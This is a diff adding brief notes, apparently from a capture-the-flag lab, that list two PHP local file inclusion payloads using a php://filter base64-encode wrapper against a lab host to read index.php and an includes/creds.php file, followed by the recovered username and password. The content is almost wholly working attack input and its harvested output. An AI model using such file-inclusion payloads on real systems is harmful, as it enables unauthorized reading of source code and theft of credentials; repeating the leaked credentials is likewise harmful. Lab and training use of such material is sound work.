@@ -1,0 +1,15 @@
+
+
+
+
+http://10.10.62.176/index.php?err=php://filter/convert.base64-encode/resource=index.php
+
+http://10.10.62.176/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php
+
+
+<?php 
+$USER = "McSkidy";
+$PASS = "A0C315Aw3s0m";
+?
+
+
